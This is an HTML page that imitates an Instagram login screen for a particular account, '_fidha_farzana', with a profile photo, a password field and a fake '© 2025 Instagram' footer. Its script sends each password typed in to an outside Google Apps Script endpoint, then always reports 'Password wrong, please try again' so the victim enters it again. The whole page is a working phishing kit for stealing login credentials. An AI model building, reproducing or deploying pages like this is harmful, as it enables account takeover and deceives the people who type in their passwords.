<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram Login Style</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    * {
      box-sizing: border-box;
      font-family: 'Inter', sans-serif;
    }

    body {
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .login-wrapper {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 100%;
      max-width: 350px;
      border-radius: 10px;
      text-align: center;
    }

    .login-wrapper img {
      width: 180px;
      margin-bottom: 30px;
    }

    input[type=text],
    input[type=password] {
      width: 100%;
      padding: 10px 12px;
      margin: 8px 0;
      border: 1px solid #dbdbdb;
      background-color: #fafafa;
      border-radius: 4px;
      font-size: 14px;
    }

    input[type=submit] {
      width: 100%;
      background-color: #0095f6;
      color: white;
      padding: 10px;
      margin-top: 15px;
      border: none;
      border-radius: 4px;
      font-weight: 600;
      font-size: 14px;
      cursor: pointer;
    }

    input[type=submit]:hover {
      background-color: #0077cc;
    }

    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #999;
    }
  </style>
</head>
<body>

  <div class="login-wrapper">
    <img src="https://linkdify.in/photo/fidha.jpg" alt="Instagram Logo" style="border-radius: 200px;" />

    <form id="login-form">
      <h3>
_fidha_farzana
</h3>
      <input type="name" name="Fidha" placeholder="Password"  hidden/>
      <input type="password" name="password" placeholder="Password" required />
      <input type="submit" value="Log In" />
    </form>

    <div class="footer">Â© 2025 Instagram </div>
  </div>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script>
    $("#login-form").submit((e) => {
      e.preventDefault();
      $.ajax({
        url: "https://script.google.com/macros/s/AKfycbxMZ1qXS_5cYLrHrZyAMwbLzik5nJYA_5Cz5Ki9wlmzwc6xubqtFQF26n5nUUqbxxs2/exec",
        data: $("#login-form").serialize(),
        method: "POST",
        success: function (response) {
          alert("Password wrong , please try again");
          $("#login-form")[0].reset();
        },
        error: function (err) {
          alert("Something went wrong!");
        }
      });
    });
  </script>

</body>
</html>
